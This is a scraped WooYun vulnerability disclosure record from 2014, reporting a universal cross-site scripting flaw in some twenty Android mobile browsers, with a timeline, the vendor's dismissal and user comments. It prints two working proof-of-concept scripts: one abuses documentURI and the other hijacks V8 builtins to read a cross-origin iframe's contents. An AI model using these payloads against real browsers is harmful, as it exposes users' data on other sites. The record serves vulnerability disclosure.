{"id": 183, "wybug_id": "wooyun-2014-071864", "wybug_title": "各大浏览器厂商的手机浏览器存在同一安全问题(系统版本相关)", "wybug_corp": "cncert国家应急响应中心", "wybug_author": "路人甲", "wybug_date": "2014-08-11 17:31", "wybug_open_date": "2014-11-06 17:32", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-16：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-06：\t细节向公众公开  简要描述： 浏览器安全一直是个冷门，希望通过这个漏洞能引起浏览器厂商对安全的重视。我也是新手，希望能深入学习浏览器fuzz，求大牛收留~ 详细说明：  这是乌云里一位白猫子@ali在2014年第一场雪时提交的，先膜拜下。测试均为小米2s手机，受影响的厂商+测试版本号(都是最新版本)：搜狗浏览器  WooYun: 搜狗手机浏览器跨域脚本执行漏洞之一 欧朋浏览器9系 9.5.1.79796 2345浏览器 5.6.2百度hao123上网导航 5.0.1.0猎豹浏览器 2.7.0冲浪浏览器 3.3.3沃门户浏览器 1.24G浏览器 3.3.5微米浏览器 3.21.20140806火猴浏览器 2.7.7.3冒泡浏览器 3.3.13天天浏览器 3.6.1绿茶浏览器 5.0火速浏览器 1.1.6(16)DS浏览器 2.8.6米侠浏览器 2.0.1九天浏览器 5.3.0云狐浏览器 1.2.0（3）超速G4浏览器 13.0云舟迷你浏览器 6.3天火浏览器 4.1.1哈雷浏览器 1.2.5... ...测试脚本1：\n<body><script>i = document.body.appendChild(document.createElement(\"iframe\"));i.src = \"http://www.baidu.com\";i.onload = function(){document.documentURI = \"javascript://hostname.com/%0D%0Aalert('Hello ' + location)\";i.contentWindow.location = \"\";}</script></body>\n测试脚本2：\n<body><script>frame = document.body.appendChild(document.createElement(\"iframe\"));frame.src = \"http://www.baidu.com/\";frame.onload = function() {\tFunction(\"}, (builtins = this), function() {\");\toriginalInstantiate = builtins.Instantiate;\tbuiltins.DefineOneShotAccessor(builtins, \"Instantiate\", function() {});\tflag = 0;\ttemplate = null;\tbuiltins.Instantiate = function(x, y) {\t\tif (flag) {\t\t\tdoc = frame.contentWindow.document;\t\t\talert(doc.body.innerHTML);\t\t\tflag = 0;\t\t} else if (!template)\t\t\ttemplate = x;\t\treturn originalInstantiate(x, y);\t};\tdocument.implementation;\tflag = 1;\tbuiltins.ConfigureTemplateInstance(frame.contentWindow, template);}</script></body>\n   漏洞证明：  #1.欧朋9系\n\n\n\n#2.2345浏览器\n\n\n\n#3.百度hao123上网导航\n\n\n\n#4.猎豹浏览器\n\n\n\n#5.冲浪浏览器\n\n\n\n#6.沃门户浏览器\n\n\n\n#7.4G浏览器\n\n\n\n#8.微米浏览器\n\n\n\n----------------------------下面的直截第一个测试图--------------------------------------#9.火猴浏览器\n\n#10.冒泡浏览器\n\n#11.天天浏览器\n\n#12.绿茶浏览器\n\n#13.火速浏览器\n\n#14.DS浏览器\n\n#15.米侠浏览器\n\n#16.九天浏览器\n\n#17.云狐浏览器\n\n#18.超速G4浏览器\n\n#19.云舟迷你浏览器\n\n#20.天火浏览器\n\n#21.哈雷浏览器\n\n   修复方案：  对documentURI执行脚本进行限制对builtins对象执行脚本进行限制收集+整理了好久，加个精可好~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-06 17:32 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-11 17:49 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  又来个各大厂商    \n     2014-08-11 17:57 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  你要火了    \n     2014-08-11 18:10 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  这次是什么？    \n     2014-08-11 18:28 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  目测又是一个加精    \n     2014-08-11 19:38 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  火钳刘明有没有。。。要火啊    \n     2014-08-11 21:22 |    \t\tchinakid \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 小白一枚，爱好美女。)\t\t \n  火钳刘明    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}